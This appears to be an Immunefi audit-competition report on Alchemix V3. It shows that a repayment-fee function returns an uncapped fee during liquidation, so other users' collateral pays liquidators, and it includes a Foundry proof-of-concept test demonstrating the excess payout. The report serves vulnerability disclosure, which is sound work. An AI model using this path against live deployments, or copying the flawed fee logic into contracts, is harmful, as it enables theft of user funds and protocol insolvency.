# 57122 sc critical mismatch between capped fee and returned fee in resolverepaymentfee&#x20;

**Submitted on Oct 23rd 2025 at 17:09:30 UTC by @farismaulana for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57122
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

the fee handling when earmark repayment happening in liquidation is incorrectly sent the uncapped fee amount when it should be capped, making the fee sent that exceed `account.collateralBalance` comes from other’s collateral instead.

## Vulnerability Details

```solidity
    function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
@>      account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
@>      return fee;
    }
```

as we can see here, when the account collateral balance would be deducted by fee, it would cap the amount if the fee is greater than `collateralBalance`.

but there are no readjustment of fee after that, making the `_resolveRepaymentFee` returning the original fee amount regardless. the returned amount then used to pay the liquidator:

```solidity
            feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
            TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
```

this can happen when earmark is large enough to force repay the full collateral position, meaning there a liquidation happening.

however if this happening, it would take more amount of MYT than what the liquidated MYT amount, as shown on the PoC below.

## Impact Details

it is possible for a liquidated account paying the liquidation/repayment fees not only from their liquidated position, but also taking from the MYT contract balance directly which is owned by another possibly healthy positions.

this further worsening the protocol condition, making the actual collateral held lower than what is accounted. this can lead to protocol insolvency.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L900>

## Proof of Concept

## Proof of Concept

add this test into `src/test/AlchemistV3.t.sol` :

```solidity
    function testLiquidate_Earmarked_Debt_Sufficient_Repayment_RepaymentFeeHigherThanBalance() external {
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // just ensureing global alchemist collateralization stays above the minimum required for regular liquidations
        // no need to mint anything
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 mintAmount = alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization;

        alchemist.mint(tokenIdFor0xBeef, mintAmount, address(0xbeef));
        vm.stopPrank();

        // Need to start a transmutator deposit, to start earmarking debt
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        uint256 transmuterPreviousBalance = IERC20(address(vault)).balanceOf(address(transmuterLogic));

        // maturing the redemption so we maxing the earmark
        vm.roll(block.number + (5_256_000));

        // Earmarked debt should be 100% of the total debt
        (, uint256 prevDebt, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);
        require(earmarked == prevDebt, "Earmarked debt should be 100% of the total debt");

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 120 bps or 12%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 1200 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // ensure initial debt is correct
        vm.assertApproxEqAbs(prevDebt, 180_000_000_000_000_000_018_000, minimumDepositOrWithdrawalLoss);

        // snapshot MYT balance of AlchemistV3 before liquidation
        uint256 alchemistMYTBalBefore = vault.balanceOf(address(alchemist));

        // let another user liquidate the previous user position
        vm.startPrank(externalUser);
        uint256 liquidatorBalanceBefore = vault.balanceOf(externalUser);
        (uint256 collateralBeforeLiquidation,,) = alchemist.getCDP(tokenIdFor0xBeef);
        (, uint256 feeInYield,) = alchemist.liquidate(tokenIdFor0xBeef);
        (uint256 collateralAfterLiquidation, uint256 debt,) = alchemist.getCDP(tokenIdFor0xBeef);
        uint256 transmuterAfterBalance = IERC20(address(vault)).balanceOf(address(transmuterLogic));
        vm.stopPrank();

        // after liquidation, collateral and debt became 0
        assertEq(collateralAfterLiquidation, 0);
        assertEq(debt, 0);

        // get liquidated collateral amount from 0xBeef position
        uint256 liquidatedCollateral = collateralBeforeLiquidation - collateralAfterLiquidation;

        // snapshot MYT balance of AlchemistV3 after liquidation
        uint256 alchemistMYTBalAfter = vault.balanceOf(address(alchemist));

        // now we can check how many MYT out from liquidation call, this account for transmuter and fee for liquidate caller
        uint256 alchemistMYTOut = alchemistMYTBalBefore - alchemistMYTBalAfter;

        // get transmuter MYT gain from liquidation
        uint256 transmuterForceRepayGain = transmuterAfterBalance - transmuterPreviousBalance;

        // get and assert liquidator MYT balance gain is equal to feeInYield
        uint256 liquidatorBalanceAfter = vault.balanceOf(externalUser);
        uint256 liquidatorCollGain = liquidatorBalanceAfter - liquidatorBalanceBefore;
        assertEq(feeInYield, liquidatorCollGain);

        // sum of transmuter MYT gain + feeInYield is equal to alchemistMYTOut
        vm.assertApproxEqAbs(transmuterForceRepayGain + feeInYield, alchemistMYTOut, 1e18, "transmuter gain + feeInYield should equal to MYT out from alchemist");

        // the alchemistMYTOut should be equal to position collateral liquidated
        vm.assertApproxEqAbs(alchemistMYTOut, liquidatedCollateral, 1e18, "MYT out should be taken only from liquidated collateral position");
    }

```

by running the test we can see the result:

```bash
Failing tests:
Encountered 1 failing test in src/test/AlchemistV3.t.sol:AlchemistV3Test
[FAIL: MYT out should be taken only from liquidated collateral position: 202000000000000000000000 !~= 200000000000000000000000 (max delta: 1000000000000000000, real delta: 2000000000000000000000)] testLiquidate_Earmarked_Debt_Sufficient_Repayment_RepaymentFeeHigherThanBalance() (gas: 3162456)

Encountered a total of 1 failing tests, 0 tests succeeded
```

MYT out from alchemist contract (sent for transmuter + fee for liquidator) are higher than the liquidated collateral position
